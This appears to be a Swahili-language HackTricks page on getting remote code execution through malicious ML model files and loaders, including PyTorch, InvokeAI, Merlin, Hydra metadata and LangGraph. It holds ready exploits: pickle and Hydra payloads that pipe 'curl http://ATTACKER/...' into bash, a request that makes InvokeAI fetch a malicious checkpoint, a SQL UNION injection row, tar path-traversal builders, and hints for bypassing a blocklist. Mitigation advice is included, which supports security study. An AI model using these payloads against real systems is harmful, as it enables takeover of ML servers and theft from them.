# RCE ya Modeli

{{#include ../banners/hacktricks-training.md}}

## Kupakia modeli ili kupata RCE

Modeli za Machine Learning kwa kawaida hushirikiwa katika miundo tofauti, kama vile ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za developers au mifumo ya production kwa matumizi. Kwa kawaida modeli hazipaswi kuwa na code hasidi, lakini katika baadhi ya hali modeli inaweza kutumika kutekeleza code yoyote kwenye mfumo kama kipengele kilichokusudiwa au kutokana na vulnerability kwenye maktaba ya kupakia modeli.

Jedwali lifuatalo linaorodhesha vulnerabilities wakilishi katika kundi hili:

| **Framework / Tool**        | **Vulnerability (CVE ikiwa ipo)**                                                    | **RCE Vector**                                                                                                                           | **Marejeleo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Uharibifu usio salama wa data iliyoserialishwa katika* `torch.load` **(CVE-2025-32434)**                                      | Pickle hasidi katika checkpoint ya modeli husababisha utekelezaji wa code (kwa kupita kinga ya `weights_only`)                            | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + upakuaji wa modeli hasidi husababisha utekelezaji wa code; RCE ya Java deserialization katika management API                      | |
| **NVIDIA Merlin Transformers4Rec** | Uharibifu usio salama wa checkpoint iliyoserialishwa kupitia `torch.load` **(CVE-2025-23298)**                      | Checkpoint isiyoaminika huanzisha pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → utekelezaji wa code katika ML worker | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook isiyo salama ya MessagePack extension **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | `filter` key inayodhibitiwa na mtumiaji huingiza sintaksia ya SQL/JSON-path, `UNION SELECT` hutengeneza row bandia ya checkpoint, kisha `msgpack` deserialization huingiza na kuita code ya Python iliyochaguliwa na mshambuliaji | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML isiyo salama) <br> **CVE-2024-3660** (Keras Lambda)                                                  | Kupakia modeli kutoka YAML hutumia `yaml.unsafe_load` (utekelezaji wa code) <br> Kupakia modeli yenye layer ya **Lambda** huendesha code yoyote ya Python | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (uchanganuzi wa TFLite)                                                                                   | Modeli ya `.tflite` iliyotengenezwa mahsusi husababisha integer overflow → uharibifu wa heap (RCE inayowezekana)                        | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kupitia `joblib.load` huendesha pickle yenye payload ya `__reduce__` ya mshambuliaji                                        | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` isiyo salama) *inapingwa*                                                                        | `numpy.load` kwa chaguo-msingi iliruhusu object arrays za pickle – `.npy/.npz` hasidi husababisha utekelezaji wa code                     | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Njia ya external-weights ya modeli ya ONNX inaweza kutoka nje ya directory (kusoma faili zozote) <br> Tar hasidi ya modeli ya ONNX inaweza kubatilisha faili zozote (na kusababisha RCE) | |
| ONNX Runtime (hatari ya muundo) | *(Hakuna CVE)* ONNX custom ops / control flow                                                                            | Modeli yenye custom operator inahitaji kupakia code asilia ya mshambuliaji; grafu changamano za modeli hutumia vibaya mantiki ili kutekeleza computations zisizokusudiwa | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia model-load API huku `--model-control` ikiwa imewezeshwa huruhusu relative path traversal ya kuandika faili (kwa mfano, kubatilisha `.bashrc` ili kupata RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (heap overflows nyingi)                                                                           | Faili ya modeli ya GGUF iliyoharibika husababisha heap buffer overflows katika parser, na kuwezesha utekelezaji wa code yoyote kwenye mfumo wa mwathiriwa | |
| **Keras (miundo ya zamani)** | *(Hakuna CVE mpya)* Modeli ya Keras H5 ya zamani                                                                            | Modeli hasidi ya HDF5 (`.h5`) yenye code ya layer ya Lambda bado hutekelezwa inapopakiwa (Keras safe_mode hailindi miundo ya zamani – “downgrade attack”) | |
| **Nyingine** (kwa jumla)    | *Kasoro ya muundo* – Pickle serialization                                                                                    | Zana nyingi za ML (kwa mfano, miundo ya modeli inayotumia pickle, Python `pickle.load`) zitatekeleza code yoyote iliyopachikwa kwenye faili za modeli isipokuwa hatua za kupunguza hatari zichukuliwe | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadata isiyoaminika inayopitishwa kwa `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config ya modeli inayodhibitiwa na mshambuliaji huweka `_target_` kuwa callable yoyote (kwa mfano, `builtins.exec`) → hutekelezwa wakati wa kupakia, hata kwa miundo “salama” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna modeli zinazotumia Python pickle, kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security), ambazo zinaweza kutumika kutekeleza code yoyote kwenye mfumo ikiwa hazitapakiwa kwa `weights_only=True`. Kwa hiyo, modeli yoyote inayotumia pickle inaweza kuwa katika hatari zaidi ya aina hii ya mashambulizi, hata kama haijaorodheshwa kwenye jedwali hapo juu.

### Metadata ya Hydra → RCE (inafanya kazi hata kwa safetensors)

`hydra.utils.instantiate()` huingiza na kuita `_target_` yoyote yenye jina la dotted katika object ya configuration/metadata. Maktaba kama Hugging Face Transformers zinapopitisha **metadata ya modeli isiyoaminika** kwa `instantiate()`, mshambuliaji anaweza kutoa callable na arguments zinazotekelezwa mara moja wakati wa kupakia modeli (hakuna pickle inayohitajika).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Mfano wa payload (unafanya kazi katika `model_config.yaml` ya `.nemo`, `config.json` ya repo, au `__metadata__` ndani ya `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Mambo muhimu:
- Hutekelezwa kabla ya uanzishaji wa model katika `restore_from/from_pretrained` ya NeMo, coders za HuggingFace za uni2TS, na loaders za FlexTok.
- Orodha ya kuzuia ya string ya Hydra inaweza kukwepwa kwa kutumia njia mbadala za import (kwa mfano, `enum.bltns.eval`) au majina yanayotatuliwa na application (kwa mfano, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok pia huchanganua metadata iliyogeuzwa kuwa string kwa kutumia `ast.literal_eval`, na hivyo kuwezesha DoS (matumizi kupita kiasi ya CPU/memory) kabla ya mwito wa Hydra.

### 🆕  RCE ya InvokeAI kupitia `torch.load` (CVE-2024-12029)

`InvokeAI` ni kiolesura maarufu cha wavuti cha open-source kwa Stable-Diffusion. Matoleo **5.3.1 – 5.4.2** hufichua endpoint ya REST `/api/v2/models/install` inayowaruhusu watumiaji kupakua na kupakia models kutoka URL zozote.<sup>[[1]](#references)</sup>

Kwa ndani, endpoint hatimaye huita:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wakati faili iliyotolewa ni **checkpoint ya PyTorch (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambulizi anaweza kupachika object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye seva ya InvokeAI.

Athari hii ilipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa exploitation

1. Unda checkpoint hasidi:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Pangisha `payload.ckpt` kwenye HTTP server unayoidhibiti (k.m. `http://ATTACKER/payload.ckpt`).
3. Washa endpoint iliyo hatarini (hakuna uthibitishaji unaohitajika):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI inapopakua faili, huita `torch.load()` → kifaa cha `os.system` huendeshwa na mshambuliaji hupata code execution katika muktadha wa mchakato wa InvokeAI.

Exploit iliyo tayari: moduli ya **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` huendesha mtiririko mzima kiotomatiki.<sup>[[3]](#references)</sup>

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (bendera ya scan imewekwa **false** kwa chaguomsingi)
•  `/api/v2/models/install` inaweza kufikiwa na mshambuliaji
•  Mchakato una ruhusa ya kutekeleza amri za shell

#### Hatua za kupunguza hatari

* Boresha hadi **InvokeAI ≥ 5.4.3** – kiraka huweka `scan=True` kwa chaguomsingi na huchunguza malware kabla ya deserialization.<sup>[[2]](#references)</sup>
* Unapopakia checkpoints kwa kutumia programu, tumia `torch.load(file, weights_only=True)` au helper mpya ya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Tekeleza allow-lists / signatures kwa vyanzo vya model na endesha huduma kwa ruhusa za kiwango cha chini.

> ⚠️ Kumbuka kwamba **umbizo lolote** linalotegemea Python pickle (ikiwemo faili nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) si salama kiasili kulifanyia deserialization kutoka vyanzo visivyoaminika.

---

Mfano wa hatua ya kupunguza hatari ya muda ikiwa ni lazima uendelee kutumia matoleo ya zamani ya InvokeAI nyuma ya reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyo salama (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilifichua loader isiyo salama ya checkpoint iliyokuwa ikiita moja kwa moja `torch.load()` kwenye paths zilizotolewa na mtumiaji. Kwa kuwa `torch.load` hutegemea Python `pickle`, checkpoint inayodhibitiwa na mshambuliaji inaweza kutekeleza code kiholela kupitia reducer wakati wa deserialization.<sup>[[5]](#references)</sup>

Path iliyo hatarini (kabla ya marekebisho): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Sababu ya hii kusababisha RCE: Katika Python pickle, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na arguments. Callable hutekelezwa wakati wa unpickling. Ikiwa object kama hiyo imo kwenye checkpoint, hutekelezwa kabla weights zozote hazijatumika.

Mfano mdogo wa checkpoint hasidi:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Njia za uwasilishaji na blast radius:
- Checkpoint/model zilizowekewa Trojan na kushirikiwa kupitia repos, buckets, au artifact registries
- Pipelines za resume/deploy zinazopakia checkpoints kiotomatiki
- Utekelezaji hufanyika ndani ya worker za training/inference, mara nyingi zikiwa na privileges zilizoinuliwa (kwa mfano, root kwenye containers)

Marekebisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha `torch.load()` ya moja kwa moja na deserializer yenye vizuizi na allow-list, iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya hukagua aina na fields, na huzuia arbitrary callables kuitwa wakati wa upakiaji.<sup>[[7]](#references)</sup>

Mwongozo wa kujilinda mahususi kwa PyTorch checkpoints:
- Usifanye unpickle data isiyoaminika. Pendelea formats zisizotekelezeka kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX inapowezekana.
- Ikiwa lazima utumie PyTorch serialization, hakikisha `weights_only=True` (inatumika katika PyTorch mpya zaidi) au tumia unpickler maalum yenye allow-list inayofanana na patch ya Transformers4Rec.<sup>[[4]](#references)</sup>
- Hakikisha provenance/signatures za model na uweke deserialization kwenye sandbox (seccomp/AppArmor; mtumiaji asiye root; FS yenye vizuizi na bila network egress).
- Fuatilia child processes zisizotarajiwa kutoka kwa ML services wakati wa kupakia checkpoint; fuatilia matumizi ya `torch.load()`/`pickle`.

POC na marejeleo ya vulnerable/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader ya vulnerable kabla ya patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC ya checkpoint hasidi: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ya baada ya patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Mfano – kutengeneza model hasidi ya PyTorch

- Unda model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Pakia modeli:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization ya Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

`resnet` endpoint ya Tencent’s FaceDetection-DSFD hufanya deserialization ya data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kumshawishi mwathiriwa afungue ukurasa/faili hasidi, na kuifanya itume blob iliyoundwa kwa makusudi kwenye endpoint hiyo, kisha kusababisha deserialization ifanyike kama `root`, na hivyo kusababisha mfumo kuathirika kikamilifu.

Mtiririko wa exploit unafanana na matumizi mabaya ya kawaida ya pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Gadget yoyote inayoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, callbacks za framework, n.k.) inaweza kutumiwa kama silaha kwa njia hiyo hiyo, bila kujali kama usafirishaji ulifanyika kupitia HTTP, WebSocket, au faili iliyowekwa kwenye directory inayofuatiliwa.



### LangGraph checkpointer SQLi → MessagePack RCE

Msururu huu wa mashambulizi unavutia kwa sababu mshambuliaji **hahitaji kupakia faili ya model yenye nia mbaya**. Badala yake, programu hufichua **API ya persistence ya AI-agent** (`get_state_history(..., filter=...)`), na input ya mtumiaji hufika kwenye query builder ya checkpointer.

#### 1. Structural SQLi kwenye metadata filters

Muundo hatari wa SQLite ulionekana hivi:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Thamani hufungwa baadaye, lakini `query_key` inaunganishwa kwenye **mfuatano wa JSON path**, kwa hiyo `'` ndani ya ufunguo wa kamusi hutoka kwenye `'$.{query_key}'` na kuingiza SQL. Somo hilohilo linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na sehemu za TTL**: placeholders hulinda thamani pekee, si sintaksia ya kimuundo ya query.

#### 2. `UNION SELECT` inaweza kulenga sinks za baadaye, si kuiba data pekee

Query hurejesha `type` na bytes za `checkpoint` zilizofanywa serialized, ambazo hutumiwa baadaye kama:

```python
self.serde.loads_typed((type, checkpoint))
```

Hiyo inamaanisha kuwa SQLi katika kifungu cha `WHERE` inaweza kuingiza **safu ya matokeo bandia**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ikiwa baadaye code itachanganua, itadeserialize, itaandika au kutekeleza column yoyote iliyochaguliwa, linganisha column hizo na sinks zake. Katika hali hii, row ghushi hubadilisha SQLi kuwa **deserialization inayodhibitiwa na attacker**.

#### 3. Unsafe MessagePack extension hooks ni sawa na code gadgets

Njia ya `msgpack` ya LangGraph ilitumia custom extension hook iliyofungua tuple iliyopachikwa ndani na kutekeleza:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Kwa hiyo, MessagePack extension object inayosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` huagiza `os`, kupata `system`, na kutekeleza amri hiyo. Unapokagua AI frameworks, kagua **custom MessagePack/JSON/pickle revivers** ili kubaini dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Muundo wa ukaguzi wa vitendo kwa agent frameworks

Kagua ingizo lolote linalodhibitiwa na mtumiaji linalofikia:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha SQL au vipande vya Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazoamini safu zilizorejeshwa kutoka kwenye persistence layer

Msururu huu mahususi uliathiri deployments za LangGraph zinazojisimamia zikitumia **SQLite** au **Redis** checkpointers pale ambapo watumiaji wasioaminika wangeweza kudhibiti `filter`. Matoleo yaliyorekebishwa yaliyotajwa kwenye ufichuzi yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models hadi Path Traversal

Kama ilivyoelezwa kwenye [**chapisho hili la blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), miundo mingi ya modeli inayotumiwa na AI frameworks tofauti hutegemea archives, kwa kawaida `.zip`. Kwa hiyo, huenda ikawezekana kutumia miundo hii vibaya kutekeleza mashambulizi ya Path Traversal, na hivyo kuruhusu kusoma faili zozote kutoka kwenye mfumo ambako modeli inapakiwa.<sup>[[16]](#references)</sup>

Kwa mfano, kwa kutumia msimbo ufuatao unaweza kuunda modeli itakayounda faili kwenye saraka ya `/tmp` inapopakiwa:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Au, kwa kutumia msimbo ufuatao unaweza kuunda modeli itakayounda symlink ya saraka ya `/tmp` itakapopakiwa:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Uchambuzi wa kina: Uondoaji-serialishaji wa Keras .keras na kutafuta gadget

Kwa mwongozo maalum kuhusu vipengele vya ndani vya .keras, RCE ya Lambda-layer, tatizo la uingizaji holela katika matoleo ≤ 3.8, na ugunduzi wa gadget ndani ya allowlist baada ya marekebisho, tazama:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blogu ya OffSec – "CVE-2024-12029 – Uondoaji-serialishaji wa data isiyoaminika katika InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit ya marekebisho ya InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Nyaraka za moduli ya Metasploit ya Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – masuala ya usalama kuhusu torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blogu ya ZDI – CVE-2025-23298: Kupata utekelezaji wa msimbo wa mbali katika NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Ilani ya ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit ya marekebisho ya Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader hatarishi kabla ya marekebisho (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC ya checkpoint hasidi (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader baada ya marekebisho (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Utekelezaji wa msimbo wa mbali kupitia miundo na maktaba za kisasa za AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Nyaraka za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit ya orodha ya kuzuia ya Hydra (onyo kuhusu RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Utafiti wa Check Point – Kutoka SQLi hadi RCE: Kutumia Checkpointer ya LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Kugeuza hitilafu za Archive Slip kuwa fursa za thamani kubwa za bug bounty za AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
